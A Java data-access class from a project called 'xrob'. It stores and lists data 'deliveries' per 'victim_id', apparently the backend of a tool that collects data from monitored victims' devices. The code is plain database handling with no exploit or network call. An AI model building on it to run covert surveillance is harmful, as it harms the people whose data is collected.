package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.utils.clientpanel.TimeUtils;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * To manage server data deliveries
 * Created by theapache64 on 11/29/2015.
 */
public class Deliveries extends BaseTable<Delivery> {

    static final String TABLE_NAME_DELIVERIES = "deliveries";
    private static final String COLUMN_DATA_TYPE = "data_type";
    private static final String COLUMN_MESSAGE = "message";
    private static Deliveries instance = new Deliveries();

    private Deliveries() {
        super("deliveries");
    }

    public static Deliveries getInstance() {
        return instance;
    }


    @Override
    public boolean add(Delivery delivery) {

        boolean isAdded = false;

        final String query = "INSERT INTO deliveries (victim_id,error,message,server_error, server_error_message,data_type) VALUES (?,?,?,?,?,?);";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);


            ps.setString(1, delivery.getVictimId());
            ps.setBoolean(2, delivery.hasError());
            ps.setString(3, delivery.getMessage());
            ps.setBoolean(4, delivery.hasServerError());
            ps.setString(5, delivery.getServerErrorMessage());
            ps.setString(6, delivery.getDataType());

            isAdded = ps.executeUpdate() == 1;

            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return isAdded;
    }

    @Override
    public void addv2(Delivery delivery) throws RuntimeException {
        if (!add(delivery)) {
            throw new RuntimeException("Failed to add delivery details");
        }
    }

    public String getLastDeliveryTime(@Nullable final String type, String theVictimId) {
        String query = "SELECT UNIX_TIMESTAMP(last_logged_at) AS unix_epoch FROM deliveries WHERE victim_id = ?";
        if (type != null) {
            query += " AND data_type =?";
        }
        query += " ORDER BY id DESC LIMIT 1 ";

        String relativeTime = null;
        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, theVictimId);
            if (type != null) {
                ps.setString(2, type);
            }
            final ResultSet rs = ps.executeQuery();

            if (rs.first()) {
                relativeTime = TimeUtils.getRelativeTime(false, rs.getLong(COLUMN_AS_UNIX_EPOCH));
            }
            rs.close();
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return relativeTime;
    }

    public List<Delivery> getAll(String victimId) {

        List<Delivery> deliveries = null;
        final String query = "SELECT data_type,message, UNIX_TIMESTAMP(last_logged_at) AS unix_epoch FROM deliveries WHERE victim_id= ? ORDER BY id DESC;";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, victimId);
            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                deliveries = new ArrayList<>();
                do {
                    final String dataType = rs.getString(COLUMN_DATA_TYPE);
                    final String message = rs.getString(COLUMN_MESSAGE);
                    final long syncedAt = rs.getLong(COLUMN_AS_UNIX_EPOCH);

                    try {
                        deliveries.add(new Delivery(null, false, message, dataType, syncedAt));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                } while (rs.next());
            }
            rs.close();
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
            try {
                con.close();
            } catch (SQLException e1) {
                e1.printStackTrace();
            }
        }
        return deliveries;
    }
}
